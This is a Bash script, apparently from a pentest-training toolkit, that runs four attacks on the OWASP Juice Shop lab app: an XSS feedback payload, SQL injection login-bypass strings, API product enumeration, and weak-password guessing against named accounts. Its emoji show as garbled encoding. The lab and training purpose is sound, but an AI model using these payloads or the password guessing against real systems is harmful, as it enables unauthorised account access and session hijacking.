#!/bin/bash
# modules/labs/juiceshop/exploits.sh - Exploits Juice Shop (4 essentiels)

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/juice_exploits"
mkdir -p "$LOG_DIR"

# ==========================
# 1. XSS via Feedbacks
# ==========================

exploit_xss_feedback() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [Juice Shop - XSS via Feedbacks]${NC}"
    echo -e "${CYAN}üìñ Objectif : XSS via API feedbacks${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : Session hijacking${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Input validation, CSP${NC}"
    echo
    
    check_tools curl jq || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"
    
    local payload="<script>alert('JUICE_XSS')</script>"
    
    echo -e "\n${YELLOW}‚ñ∂ Test XSS via API...${NC}\n"
    
    local endpoints=(
        "/api/Feedbacks"
        "/rest/Feedbacks"
    )
    
    for ep in "${endpoints[@]}"; do
        local url="${BASE}${ep}"
        
        echo -e "${CYAN}Testing: $url${NC}"
        
        local resp=$(curl -s -X POST "$url" \
            -H 'Content-Type: application/json' \
            -d "{\"message\":\"$payload\",\"rating\":5,\"captcha\":\"\",\"captchaId\":0}" \
            2>/dev/null)
        
        local http_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \
            -H 'Content-Type: application/json' \
            -d "{\"message\":\"$payload\",\"rating\":5}" \
            2>/dev/null)
        
        echo -e "${CYAN}HTTP: $http_code${NC}"
        
        if [[ "$http_code" =~ ^2 ]]; then
            echo -e "${GREEN}‚úÖ Payload accept√© (code $http_code)${NC}"
            log_exploit "${LOG_DIR}/xss.log" "SUCCESS" "XSS via $ep"
            
            echo "$resp" | jq '.' 2>/dev/null || echo "$resp"
            break
        else
            echo -e "${YELLOW}‚ö†Ô∏è Endpoint non accessible ou payload rejet√©${NC}"
        fi
        
        echo
    done
    
    read -p "üëâ Entr√©e..."
}

# ==========================
# 2. SQL Injection (Login Bypass)
# ==========================

exploit_sqli_login() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [Juice Shop - SQLi Login Bypass]${NC}"
    echo -e "${CYAN}üìñ Objectif : Bypass authentification${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : Acc√®s non autoris√©${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Prepared statements${NC}"
    echo
    
    check_tools curl jq || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"
    
    local payloads=(
        '{"email":"\" OR 1=1--","password":"x"}'
        '{"email":"admin@juice-sh.op'\''--","password":"x"}'
        '{"email":"\" OR \"\"=\"","password":"x"}'
    )
    
    echo -e "\n${YELLOW}‚ñ∂ Test SQLi login...${NC}\n"
    
    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}Payload: $payload${NC}"
        
        local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
            -H 'Content-Type: application/json' \
            -d "$payload" \
            2>/dev/null)
        
        echo "$resp" | jq '.' 2>/dev/null || echo "$resp"
        
        if echo "$resp" | grep -qi "token\|authentication"; then
            echo -e "${GREEN}‚úÖ SQLi SUCCESS - Token obtenu${NC}"
            log_exploit "${LOG_DIR}/sqli.log" "SUCCESS" "SQLi bypass"
            break
        else
            echo -e "${YELLOW}‚ö†Ô∏è √âchec SQLi avec ce payload${NC}"
        fi
        
        echo
    done
    
    read -p "üëâ Entr√©e..."
}

# ==========================
# 3. Enum√©ration Products (API)
# ==========================

exploit_enum_products() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [Juice Shop - Enum Products]${NC}"
    echo -e "${CYAN}üìñ Objectif : Enum√©ration via API${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : Information disclosure${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Rate limiting, Auth${NC}"
    echo
    
    check_tools curl jq || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"
    
    echo -e "\n${YELLOW}‚ñ∂ Enum√©ration products...${NC}\n"
    
    local resp=$(curl -s "${BASE}/rest/products/search?q=" 2>/dev/null)
    
    if echo "$resp" | jq '.' >/dev/null 2>&1; then
        echo -e "${GREEN}‚úÖ API accessible${NC}\n"
        
        local count=$(echo "$resp" | jq '.data | length' 2>/dev/null)
        echo -e "${CYAN}üì¶ Produits trouv√©s: $count${NC}\n"
        
        echo "$resp" | jq '.data[0:3] | .[] | {name: .name, price: .price, description: .description}' 2>/dev/null
        
        log_exploit "${LOG_DIR}/enum.log" "SUCCESS" "Products enumerated: $count"
    else
        echo -e "${RED}‚ùå √âchec √©num√©ration${NC}"
        echo "$resp"
    fi
    
    echo
    read -p "üëâ Entr√©e..."
}

# ==========================
# 4. Weak Passwords
# ==========================

exploit_weak_passwords() {
    clear
    banner
    echo -e "${MAGENTA}üß™ [Juice Shop - Weak Passwords]${NC}"
    echo -e "${CYAN}üìñ Objectif : Test passwords communs${NC}"
    echo -e "${YELLOW}‚ö†Ô∏è Risque : Account takeover${NC}"
    echo -e "${GREEN}üõ°Ô∏è Mitigation : Strong password policy${NC}"
    echo
    
    check_tools curl jq || { read -p "üëâ Entr√©e..."; return; }
    
    local IP PORT BASE
    IP=$(get_host_ip)
    
    read -p "üåê IP ($IP): " input; IP=${input:-$IP}
    read -p "üîå Port (3000): " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"
    
    local emails=(
        "admin@juice-sh.op"
        "jim@juice-sh.op"
        "bender@juice-sh.op"
    )
    
    local passwords=(
        "admin123"
        "password"
        "123456"
        "qwerty"
    )
    
    echo -e "\n${YELLOW}‚ñ∂ Test weak passwords...${NC}\n"
    
    for email in "${emails[@]}"; do
        for pass in "${passwords[@]}"; do
            echo -e "${CYAN}Testing: $email : $pass${NC}"
            
            local payload="{\"email\":\"$email\",\"password\":\"$pass\"}"
            
            local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
                -H 'Content-Type: application/json' \
                -d "$payload" \
                2>/dev/null)
            
            if echo "$resp" | grep -qi "authentication.*token"; then
                echo -e "${GREEN}‚úÖ VALID: $email:$pass${NC}"
                log_exploit "${LOG_DIR}/weak_pass.log" "SUCCESS" "Valid: $email:$pass"
                echo
            fi
        done
    done
    
    echo -e "${CYAN}Test termin√©${NC}"
    read -p "üëâ Entr√©e..."
}

# ==========================
# Menu
# ==========================

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}=== üí£ Exploits Juice Shop ===${NC}"
        echo
        echo -e "${GREEN}1) XSS via Feedbacks${NC}"
        echo -e "${GREEN}2) SQLi Login Bypass${NC}"
        echo -e "${GREEN}3) Enum Products (API)${NC}"
        echo -e "${GREEN}4) Weak Passwords${NC}"
        echo
        echo -e "${RED}0) Retour${NC}"
        echo
        read -p "üëâ Choix : " choice

        case $choice in
            1) exploit_xss_feedback ;;
            2) exploit_sqli_login ;;
            3) exploit_enum_products ;;
            4) exploit_weak_passwords ;;
            0) return ;;
            *)
                echo -e "${RED}‚ùå Invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
